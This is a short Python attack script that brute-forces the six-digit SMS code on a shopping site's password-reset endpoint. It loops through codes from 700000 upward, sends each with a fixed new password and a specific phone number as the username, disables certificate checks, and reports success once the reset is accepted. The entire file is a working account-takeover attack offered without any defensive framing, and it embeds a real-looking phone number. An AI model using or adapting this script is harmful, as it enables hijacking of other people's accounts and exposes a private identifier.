#!/usr/bin/env python
# coding=utf-8
import requests,re
for i in range(700000,999999):
    r = requests.get("https://safe.dangdang.com/find_password_submit.php?jsoncallback=jQuery1113039138950650049176_1536992275187&txtNewPwd=wjq47909952&txtUser=13811010236&txtMobile=&txtSmsVcode=%s&txtEmailVcode=&_=1536992275188"%str(i),verify=False)
    t = r.text
    s = re.search("\"returnval\":(\d+)}\)",t).groups()[0]
    if s == "0":
        print("success")
        break